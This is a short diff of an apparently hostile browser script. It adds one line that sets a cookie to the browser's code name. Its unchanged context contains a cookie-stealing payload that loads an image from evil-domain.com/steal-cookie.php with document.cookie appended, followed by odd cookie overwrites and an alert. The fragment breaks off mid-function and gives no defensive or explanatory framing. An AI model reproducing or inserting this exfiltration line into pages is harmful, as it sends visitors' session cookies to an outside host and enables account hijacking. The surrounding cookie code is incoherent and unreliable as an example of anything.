@@ -1,6 +1,7 @@
 <script> 
 (new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 document.cookie = "name=henrietta"; 
+document.cookie = navigator.appCodeName;
 document.cookie = navigator.appVersion;  
 
 function doOnce() { if (!document.cookie.split('; ').find(row => row.startsWith('doSomethingOnlyOnce'))) { alert(document.cookie); 
